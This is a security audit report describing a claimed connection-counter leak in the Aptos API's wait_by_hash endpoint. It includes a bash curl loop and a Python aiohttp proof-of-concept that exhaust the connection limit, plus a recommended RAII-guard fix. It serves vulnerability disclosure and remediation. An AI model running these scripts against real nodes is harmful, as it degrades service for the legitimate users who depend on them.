# Audit Report

## Title
Resource Leak in wait_by_hash Endpoint Allows Connection Limit Exhaustion DoS Attack

## Summary
The `wait_transaction_by_hash` endpoint in the Aptos API contains an async resource leak vulnerability where cancelled HTTP requests fail to decrement the active connection counter. An attacker can exhaust the `wait_by_hash_max_active_connections` limit by sending multiple requests and immediately closing connections, permanently denying long-polling functionality to legitimate users.

## Finding Description

The vulnerability exists in the connection counting mechanism that limits concurrent wait_by_hash requests. The endpoint uses an atomic counter to track active connections and enforces a configurable limit (default: 100 connections). [1](#0-0) 

The critical flaw is that the counter increment occurs before the async operation, but the decrement happens after the `.await` point: [2](#0-1) 

In async Rust, when a future is dropped (e.g., when an HTTP client closes the connection prematurely), code after an `.await` point may never execute. This means if a request is cancelled after incrementing the counter at line 243 but before completing the wait operation, the decrement at line 274 never occurs, causing a permanent leak.

The connection limit is configured in the API settings: [3](#0-2) 

The counter is stored in the Context structure: [4](#0-3) [5](#0-4) 

**Attack Execution:**
1. Attacker sends 100+ concurrent HTTP requests to `/transactions/wait_by_hash/:txn_hash`
2. Each request increments the counter atomically
3. Attacker immediately closes all connections (TCP RST or connection abort)
4. The futures are dropped, preventing counter decrements
5. The counter remains at or above 100 permanently
6. All subsequent legitimate requests bypass long-polling and fall back to short-polling
7. Users experience degraded service, requiring manual polling instead of efficient waiting

This breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits." The connection limit is effectively unenforced after the attack.

## Impact Explanation

**Severity: Medium** ($10,000 impact category per Aptos Bug Bounty)

This vulnerability causes service degradation but not complete unavailability:

- **Availability Impact**: The wait_by_hash endpoint still functions but loses its long-polling optimization. Legitimate users must fall back to manual polling, increasing latency and network overhead.
- **No Data Loss**: No funds, consensus integrity, or state consistency is compromised.
- **Partial DoS**: Only affects the wait_by_hash endpoint; other API endpoints remain fully functional.
- **Persistent Effect**: The counter leak is permanent until node restart, requiring operator intervention.

The impact aligns with Medium severity: "State inconsistencies requiring intervention" - the connection counter state becomes inconsistent and requires node restart to reset.

## Likelihood Explanation

**Likelihood: High**

The attack is trivially easy to execute:

- **No Authentication Required**: The API endpoint is publicly accessible
- **Simple Exploit**: Basic HTTP clients (curl, Python requests) can execute the attack with connection timeouts or aborts
- **Low Resource Cost**: Attacker needs minimal bandwidth and can use connection reuse
- **Immediate Effect**: 100 cancelled requests exhaust the limit instantly
- **Difficult to Detect**: Appears as normal connection errors in logs

Example attack vector:
```bash
# Using curl with timeout to cancel requests
for i in {1..150}; do
  curl -m 0.1 "http://api-node:8080/transactions/wait_by_hash/0x$(openssl rand -hex 32)" &
done
```

## Recommendation

Implement RAII-style resource management using a guard that ensures the counter is decremented even if the future is dropped:

```rust
// Add a guard structure
struct ConnectionGuard {
    counter: Arc<AtomicUsize>,
}

impl Drop for ConnectionGuard {
    fn drop(&mut self) {
        self.counter.fetch_sub(1, Ordering::Relaxed);
        WAIT_TRANSACTION_GAUGE.dec();
    }
}

// Modify wait_transaction_by_hash
async fn wait_transaction_by_hash(
    &self,
    accept_type: AcceptType,
    txn_hash: Path<HashValue>,
) -> BasicResultWith404<Transaction> {
    // Check limit first
    let current = self.context.wait_for_hash_active_connections
        .fetch_add(1, Ordering::Relaxed);
    
    if current >= self.context.node_config.api.wait_by_hash_max_active_connections {
        self.context.wait_for_hash_active_connections
            .fetch_sub(1, Ordering::Relaxed);
        metrics::WAIT_TRANSACTION_POLL_TIME
            .with_label_values(&["short"])
            .observe(0.0);
        return self.get_transaction_by_hash_inner(&accept_type, txn_hash.0).await;
    }
    
    // Create guard that will decrement on drop
    let _guard = ConnectionGuard {
        counter: self.context.wait_for_hash_active_connections.clone(),
    };
    
    let start_time = std::time::Instant::now();
    WAIT_TRANSACTION_GAUGE.inc();
    
    let result = self.wait_transaction_by_hash_inner(
        &accept_type,
        txn_hash.0,
        self.context.node_config.api.wait_by_hash_timeout_ms,
        self.context.node_config.api.wait_by_hash_poll_interval_ms,
    ).await;
    
    metrics::WAIT_TRANSACTION_POLL_TIME
        .with_label_values(&["long"])
        .observe(start_time.elapsed().as_secs_f64());
    
    // Guard automatically decrements counter here
    result
}
```

Alternative: Use `scopeguard` crate for simpler implementation:
```rust
use scopeguard::defer;

// At the start of the function after incrementing:
defer! {
    self.context.wait_for_hash_active_connections
        .fetch_sub(1, Ordering::Relaxed);
    WAIT_TRANSACTION_GAUGE.dec();
}
```

## Proof of Concept

```python
#!/usr/bin/env python3
"""
PoC: Exhaust wait_by_hash connection limit via cancelled requests
"""
import asyncio
import aiohttp
import hashlib
import os

API_URL = "http://localhost:8080"
TARGET_ENDPOINT = "/transactions/wait_by_hash/"
ATTACK_COUNT = 150  # Exceed default limit of 100

async def cancel_request(session, txn_hash):
    """Send request and cancel it immediately"""
    try:
        # Set very short timeout to force cancellation
        async with session.get(
            f"{API_URL}{TARGET_ENDPOINT}{txn_hash}",
            timeout=aiohttp.ClientTimeout(total=0.01)
        ) as resp:
            await resp.text()
    except (asyncio.TimeoutError, aiohttp.ClientError):
        # Expected - connection cancelled
        pass

async def exploit():
    """Execute the attack"""
    print(f"[*] Starting attack: sending {ATTACK_COUNT} cancelled requests")
    
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(ATTACK_COUNT):
            # Generate random transaction hash
            txn_hash = "0x" + hashlib.sha256(os.urandom(32)).hexdigest()
            tasks.append(cancel_request(session, txn_hash))
        
        await asyncio.gather(*tasks, return_exceptions=True)
    
    print("[+] Attack complete. Connection counter should be exhausted.")
    print("[*] Testing legitimate request (should be short-polled)...")
    
    # Test with legitimate request
    async with aiohttp.ClientSession() as session:
        test_hash = "0x" + hashlib.sha256(b"test").hexdigest()
        start = asyncio.get_event_loop().time()
        
        try:
            async with session.get(
                f"{API_URL}{TARGET_ENDPOINT}{test_hash}",
                timeout=aiohttp.ClientTimeout(total=5)
            ) as resp:
                elapsed = asyncio.get_event_loop().time() - start
                print(f"[!] Response time: {elapsed:.3f}s")
                if elapsed < 0.1:
                    print("[+] VULNERABLE: Request was short-polled (limit exhausted)")
                else:
                    print("[-] Request was long-polled (limit not exhausted)")
        except Exception as e:
            print(f"[!] Request failed: {e}")

if __name__ == "__main__":
    asyncio.run(exploit())
```

**Expected Result**: After running the PoC, subsequent legitimate requests to wait_by_hash will be immediately short-polled instead of long-polled, confirming the connection limit has been exhausted by the leak.

---

**Notes**

This vulnerability demonstrates a common pitfall in async Rust resource management where cleanup code placed after `.await` points can be skipped if futures are dropped. The proper pattern requires RAII guards or scope guards to ensure cleanup occurs regardless of how the future completes or is cancelled.

### Citations

**File:** api/src/transactions.rs (L239-259)
```rust
        // Short poll if the active connections are too high
        if self
            .context
            .wait_for_hash_active_connections
            .fetch_add(1, std::sync::atomic::Ordering::Relaxed)
            >= self
                .context
                .node_config
                .api
                .wait_by_hash_max_active_connections
        {
            self.context
                .wait_for_hash_active_connections
                .fetch_sub(1, std::sync::atomic::Ordering::Relaxed);
            metrics::WAIT_TRANSACTION_POLL_TIME
                .with_label_values(&["short"])
                .observe(0.0);
            return self
                .get_transaction_by_hash_inner(&accept_type, txn_hash.0)
                .await;
        }
```

**File:** api/src/transactions.rs (L261-280)
```rust
        let start_time = std::time::Instant::now();
        WAIT_TRANSACTION_GAUGE.inc();

        let result = self
            .wait_transaction_by_hash_inner(
                &accept_type,
                txn_hash.0,
                self.context.node_config.api.wait_by_hash_timeout_ms,
                self.context.node_config.api.wait_by_hash_poll_interval_ms,
            )
            .await;

        WAIT_TRANSACTION_GAUGE.dec();
        self.context
            .wait_for_hash_active_connections
            .fetch_sub(1, std::sync::atomic::Ordering::Relaxed);
        metrics::WAIT_TRANSACTION_POLL_TIME
            .with_label_values(&["long"])
            .observe(start_time.elapsed().as_secs_f64());
        result
```

**File:** config/src/config/api_config.rs (L144-144)
```rust
            wait_by_hash_max_active_connections: 100,
```

**File:** api/src/context.rs (L84-84)
```rust
    pub wait_for_hash_active_connections: Arc<AtomicUsize>,
```

**File:** api/src/context.rs (L136-136)
```rust
            wait_for_hash_active_connections: Arc::new(AtomicUsize::new(0)),
```
